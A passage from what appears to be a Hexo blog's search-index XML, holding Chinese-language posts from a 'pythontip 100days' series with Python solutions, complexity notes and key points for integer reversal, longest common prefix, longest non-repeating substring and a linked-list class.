operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>str_x<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        str_x <span class="token operator">=</span> str_x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>str_x<span class="token punctuation">)</span>        x <span class="token operator">=</span> <span class="token operator">-</span>x    <span class="token keyword">return</span> x <span class="token keyword">if</span> <span class="token operator">-</span><span class="token number">2147483648</span> <span class="token operator">&lt;</span> x <span class="token operator">&lt;</span> <span class="token number">2147483647</span> <span class="token keyword">else</span> <span class="token number">0</span>                                                         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h3><ol><li>时间复杂度O(n)</li><li>空间复杂度O(n)</li></ol><h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ol><li>转为字符串处理</li><li>考虑溢出的情况</li></ol><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token punctuation">,</span> res <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token comment"># 则其数值范围为 [−2^31,  2^31 − 1]</span>    boundry <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">if</span> x<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">31</span> <span class="token comment"># 2147483648-1, 2147483648 </span>    <span class="token keyword">while</span> y <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> res<span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span>y<span class="token operator">%</span><span class="token number">10</span>        <span class="token keyword">if</span> res <span class="token operator">&gt;</span> boundry <span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>        y <span class="token operator">//=</span><span class="token number">10</span>    <span class="token keyword">return</span> res <span class="token keyword">if</span> x <span class="token operator">&gt;</span><span class="token number">0</span> <span class="token keyword">else</span> <span class="token operator">-</span>res                                                        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="性能-1"><a href="#性能-1" class="headerlink" title="性能"></a>性能</h3><ol><li>时间复杂度log10(n)</li><li>空间复杂度O(1)</li></ol><h3 id="关键点-1"><a href="#关键点-1" class="headerlink" title="关键点"></a>关键点</h3><ol><li>利用除法和取模运算</li><li>考虑溢出的情况</li></ol><h3 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse_str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 判断x的正负    2. 提取x每一位数字存储在列表    3. 然后使用按权值相加    :param x:    :return:    """</span>    x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># 表示正负</span>    <span class="token keyword">if</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token boolean">False</span>        x <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    x <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> flag<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token operator">-</span>result    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="性能-2"><a href="#性能-2" class="headerlink" title="性能"></a>性能</h4><ol><li>时间复杂度log10(n)</li><li>空间复杂度O(1)</li></ol><h4 id="关键点-2"><a href="#关键点-2" class="headerlink" title="关键点"></a>关键点</h4><ol><li>利用字符串实现符号判断和反转</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day11</title>
      <link href="//code/python/pythontip-100days-day11/"/>
      <url>//code/python/pythontip-100days-day11/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个函数来查找字符串数组中的最长公共前缀。如果不存在公共前缀，返回空字符串 ‘’</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>[“flower”,”flow”,”flight”] -&gt; ‘fl’</li><li>[“dog”,”racecar”,”car”] -&gt; ‘’</li></ul><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ul><li>输入的字符串一定不为None或空串</li><li>输入的字符串中的字符仅为小写英文字母</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>找出前两个字符串的最长公共前缀</li><li>找1中最长公共前缀和下一个串的最长公共前缀</li><li>继续找上一个最长公共前缀和下一个串最长公共前缀</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1:"></a>解法1:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">longestCommonPrefix</span><span class="token punctuation">(</span>strs<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> strs<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">""</span>    prefix<span class="token punctuation">,</span> count <span class="token operator">=</span> strs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>strs<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">:</span>        prefix <span class="token operator">=</span> self<span class="token punctuation">.</span>lcp<span class="token punctuation">(</span>prefix<span class="token punctuation">,</span> strs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> prefix<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> prefix<span class="token keyword">def</span> <span class="token function">lcp</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    length<span class="token punctuation">,</span> index <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">while</span> index <span class="token operator">&lt;</span> length <span class="token keyword">and</span> str1<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">==</span> str2<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">:</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span>index<span class="token punctuation">]</span>                                                        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h4><ol><li>时间复杂度O(mn)</li><li>空间复杂度O(1)</li></ol><h4 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h4><p>1.找出前两个字符串的最长公共前缀</p><p>2.找1中最长公共前缀和下一个串的最长公共前缀</p><p>3.继续找上一个最长公共前缀和下一个串的最长公共前缀</p><h4 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h4><ol><li>将第一个字符串作为前缀，和第二个比较，返回公共前缀</li><li>遍历字符串，返回公共前缀和后一个字符的公共部分</li><li>木桶原则，以最短的部分作为最长公共前缀</li></ol><h3 id="算法2："><a href="#算法2：" class="headerlink" title="算法2："></a>算法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">longestCommonPrefix</span><span class="token punctuation">(</span>strs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    :param strs:    :return:    """</span>    base <span class="token operator">=</span> strs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># 前缀池</span>    prefix <span class="token operator">=</span> base<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># 前缀</span>    base <span class="token operator">=</span> base<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 字符串计数器</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment"># 遍历列表中的字符串是否都是以prefix为前缀，使用flag计数</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> strs<span class="token punctuation">:</span>            <span class="token keyword">if</span> item<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>strs<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 如果计数器和列表长度相同，则增加前缀长度</span>            <span class="token comment"># 如果第一个字符串是列表中最短字符串时，会发生越界</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                prefix <span class="token operator">+=</span> base<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                base <span class="token operator">=</span> base<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">except</span> IndexError <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> prefix            flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> prefix<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="性能-1"><a href="#性能-1" class="headerlink" title="性能"></a>性能</h4><ol><li>时间复杂度O(mn)</li><li>空间复杂度O(n)</li></ol><h4 id="关键点-1"><a href="#关键点-1" class="headerlink" title="关键点"></a>关键点</h4><ol><li>利用报错判断</li><li>利用startwith()判断字符串是否以某个字符串开头</li></ol><h4 id="算法描述-1"><a href="#算法描述-1" class="headerlink" title="算法描述"></a>算法描述</h4><ol><li>选择第一个字符串作为前缀选择池</li><li>使用前缀选择池的第一个字符作为前缀判断其他字符串是否以此开头</li><li>然后依次将第一个字符串后面的字符加入</li><li>当flag小于字符串数量时返回前缀，需要删除前缀的最后一个字符，因为最后一个字符加入后才导致计数器小于字符串数量，所以最后一个字符不属于公共前缀</li><li>当第一个字符串是列表中字符串长度最短的时，会发生下标越界，此时利用except捕捉错误并返回前缀</li></ol><h3 id="算法3："><a href="#算法3：" class="headerlink" title="算法3："></a>算法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span><span class="token keyword">def</span> <span class="token function">longestCommonPrefix</span><span class="token punctuation">(</span>strs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findCommonPrefix</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>        prefix <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                prefix <span class="token operator">+=</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> prefix        <span class="token keyword">return</span> prefix    <span class="token keyword">return</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span>findCommonPrefix<span class="token punctuation">,</span> strs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="性能-2"><a href="#性能-2" class="headerlink" title="性能"></a>性能</h4><ol><li>时间复杂度O(nlogn)</li><li>空间复杂度O(1)</li></ol><h4 id="关键点-2"><a href="#关键点-2" class="headerlink" title="关键点"></a>关键点</h4><p>1.算法1的reduce实现</p><h4 id="算法描述-2"><a href="#算法描述-2" class="headerlink" title="算法描述"></a>算法描述</h4><ol><li>将第一个字符串作为前缀，和第二个比较，返回公共前缀</li><li>遍历字符串，返回公共前缀和后一个字符的公共部分</li><li>木桶原则，以最短的部分作为最长公共前缀</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day10</title>
      <link href="//code/python/pythontip-100days-day10/"/>
      <url>//code/python/pythontip-100days-day10/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个字符串,返回该串中最长不含重复字符的子串长度</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>‘abcabcbb’ -&gt; 3</li><li>‘bbbbbb’ -&gt; 1</li></ul><p>##假设</p><ul><li>输入的字符串一定不为None或空串</li><li>输入的字符串中的字符仅为小写英文字母</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>枚举所有子串，判断子串是否重复</li><li>你能想出更优的解法吗</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1:"></a>解法1:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lengthOfLongestSubstring</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    longest <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            unique_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> unique_length <span class="token operator">==</span> j <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">and</span> unique_length <span class="token operator">&gt;</span> longest<span class="token punctuation">:</span>                longest <span class="token operator">=</span> unique_length                <span class="token keyword">return</span> longest                                                     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h4><ol><li>时间复杂度O(n^3)</li><li>空间复杂度O(n)</li></ol><h4 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h4><ol><li>枚举所有子串进行判断</li><li>利用set()去除重复元素</li></ol><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lengthOfLongestSubstring</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment"># 哈希集合，记录每个字符是否出现过</span>       occ <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>       <span class="token comment"># 左指针，初始值为 -1，相当于我们在字符串的左边界的左侧，还没有开始移动</span>       rk<span class="token punctuation">,</span> ans <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>       <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>               <span class="token comment"># 左指针向右移动一格，移除一个字符</span>               occ<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>           <span class="token keyword">while</span> rk <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> n <span class="token keyword">and</span> s<span class="token punctuation">[</span>rk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> occ<span class="token punctuation">:</span>               <span class="token comment"># 不断地移动右指针</span>               occ<span class="token punctuation">.</span>add<span class="token punctuation">(</span>s<span class="token punctuation">[</span>rk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>               rk <span class="token operator">+=</span> <span class="token number">1</span>           <span class="token comment"># 第 i 到 rk 个字符是一个极长的无重复字符子串</span>           ans <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> rk <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>       <span class="token keyword">return</span> ans       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="性能-1"><a href="#性能-1" class="headerlink" title="性能"></a>性能</h4><ol><li>时间复杂度O(n)</li><li>空间复杂度O(n)</li></ol><h4 id="关键点-1"><a href="#关键点-1" class="headerlink" title="关键点"></a>关键点</h4><ol><li>双指针</li></ol><h4 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h4><ol><li>判断s是否在集合occ中，如果不在则添加。集合中存在的元素在字符串中是连续的</li><li>如果s在occ中，则会遍历删除occ中的元素，找到重复元素</li></ol><h3 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lengthOfLongestSubstring</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    输出s中所有不含重复字符的子字符串    1. 判断临时字符串中是否含有字符，如果没有则初始化临时索引为索引值    2. 判断s中索引对应的值是否在临时字符串中，如果没有则在临时字符串中追加元素，索引加一    3. 如果有，则将临时字符串追加到字符串列表中，索引为临时索引加一，临时字符串清空    :param s: 原始字符串    :return:    """</span>    index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 索引</span>    onlylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 字符串列表</span>    onlychars <span class="token operator">=</span> <span class="token string">''</span>  <span class="token comment"># 临时字符串</span>    onlycharsindex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 临时索引</span>    <span class="token keyword">while</span> index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        char <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span>        <span class="token keyword">if</span> onlychars <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            onlycharsindex <span class="token operator">=</span> index        <span class="token keyword">if</span> char <span class="token keyword">in</span> onlychars<span class="token punctuation">:</span>  <span class="token comment"># O(n)</span>            onlylist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>onlychars<span class="token punctuation">)</span>            index <span class="token operator">=</span> s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>char<span class="token punctuation">,</span> onlycharsindex<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>            onlychars <span class="token operator">=</span> <span class="token string">''</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            onlychars <span class="token operator">+=</span> char            index <span class="token operator">+=</span> <span class="token number">1</span>    onlylist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>onlychars<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>onlylist<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">for</span> chars <span class="token keyword">in</span> onlylist<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="性能-2"><a href="#性能-2" class="headerlink" title="性能"></a>性能</h4><ol><li>时间复杂度O(n)</li><li>空间复杂度O(nlogn)</li></ol><h4 id="关键点-2"><a href="#关键点-2" class="headerlink" title="关键点"></a>关键点</h4><ol><li>存储不重复元素字符串</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day9</title>
      <link href="//code/python/pythontip-100days-day9/"/>
      <url>//code/python/pythontip-100days-day9/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现一个链表类，该类有头部插入、尾部添加、查找、删除、获取长度这些方法</p><h2 id="各方法具体说明如下"><a href="#各方法具体说明如下" class="headerlink" title="各方法具体说明如下"></a>各方法具体说明如下</h2><h3 id="insert-to-front"><a href="#insert-to-front" class="headerlink" title="insert_to_front"></a><code>insert_to_front</code></h3><ul><li>在链表头部插入节点</li><li>输入可能为None</li></ul><h3 id="append"><a href="#append" class="headerlink" title="append"></a><code>append</code></h3><ul><li>在链表尾部添加节点</li><li>输入可能为None</li></ul><h3 id="find"><a href="#find" class="headerlink" title="find"></a><code>find</code></h3><ul><li>查找值为输入的节点</li><li>输入可能为None</li></ul><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a><code>delete</code></h3><ul><li>删除所有值为输入的节点</li><li>输入可能为None</li></ul><h3 id="length"><a href="#length" class="headerlink" title="length"></a><code>length</code></h3><ul><li>获取链表长度</li></ul><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法"><a href="#解法" class="headerlink" title="解法:"></a>解法:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#链表节点类</span><span class="token keyword">class</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token builtin">next</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span><span class="token builtin">next</span> <span class="token operator">=</span> <span class="token builtin">next</span>        self<span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token comment">#链表类</span><span class="token keyword">class</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> head<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>head <span class="token operator">=</span> head    <span class="token keyword">def</span> <span class="token function">insert_to_front</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>        node <span class="token operator">=</span> Node<span class="token punctuation">(</span>data<span class="token punctuation">,</span> self<span class="token punctuation">.</span>head<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>head <span class="token operator">=</span> node        <span class="token keyword">return</span> node       <span class="token keyword">def</span> <span class="token function">append</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>        node <span class="token operator">=</span> Node<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>head <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>head <span class="token operator">=</span> node            <span class="token keyword">return</span> node        curr_node <span class="token operator">=</span> self<span class="token punctuation">.</span>head        <span class="token keyword">while</span> curr_node<span class="token punctuation">.</span><span class="token builtin">next</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            curr_node <span class="token operator">=</span> curr_node<span class="token punctuation">.</span><span class="token builtin">next</span>        curr_node<span class="token punctuation">.</span><span class="token builtin">next</span> <span class="token operator">=</span> node        <span class="token keyword">return</span> node    <span class="token keyword">def</span> <span class="token function">find</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>        curr_node <span class="token operator">=</span> self<span class="token punctuation">.</span>head        <span class="token keyword">while</span> curr_node <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> curr_node<span class="token punctuation">.</span>data <span class="token operator">==</span> data<span class="token punctuation">:</span>                <span class="token keyword">return</span> 